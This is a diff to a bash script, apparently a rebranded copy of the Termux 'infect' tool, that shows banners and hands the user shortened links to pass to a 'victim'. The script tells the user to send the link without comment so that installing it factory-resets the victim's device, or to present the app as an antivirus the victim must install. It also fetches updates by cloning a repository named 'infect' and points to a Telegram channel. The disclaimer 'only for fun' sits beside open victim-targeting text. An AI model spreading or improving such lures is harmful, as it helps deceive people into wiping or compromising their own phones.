@@ -138,7 +138,7 @@ echo -e '\e[92m
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "\e[91m Copy below link and send it your victim and 
+echo -e "\e[91m 😈  Copy below link and send it your victim and 
 say nothing to him. when he install it in his 
 device it will be factory reset and lot more happens.
                                 👇👇👇
@@ -173,7 +173,7 @@ echo " "
 echo " "
 echo -e "\e[93m  Copy below link and send it your victim and tell him
 that he should install this application or else his 
-device will not be recovered.(Antivirus).
+device will not be recovered.(Antivirus)
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
@@ -181,7 +181,7 @@ device will not be recovered.(Antivirus).
                     👆👆👆
 Use only for fun purpose not for harming someone 😇✌️. 
 And our channel is not responsible for any kind of 
-loss you do to other's by this script.""
+loss you do to other's by this script."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -212,7 +212,7 @@ echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
 echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
 echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
 echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
-echo -e "\e[93m        MY WEBSITE:\e[92m www.noob-hackers.com\e[0m" | pv -qL 10
+echo -e "\e[93m        MY WEBSITE:\e[92m https://t.me/omarproxt25\e[0m" | pv -qL 10
 echo -e "\e[92m                BYEE.............." | pv -qL 10
 sleep 6.0
 banner
@@ -237,7 +237,7 @@ echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
 printf "                     \e[96m["
 # While process is running...
-while git clone https://github.com/omarproxt/infect 2> /dev/null; do 
+while git clone https://github.com/omarproxt/infectc 2> /dev/null; do 
     printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
     sleep 1
 done
@@ -275,7 +275,7 @@ echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
 read p
 if [ "$p" = "y" ];
 then
-am start -a android.intent.action.VIEW -d https://t.me/omarproxt25
+am start -a android.intent.action.VIEW -d https://t.me/omarproxt25 2>/dev/null
 clear
 baner1
 menu
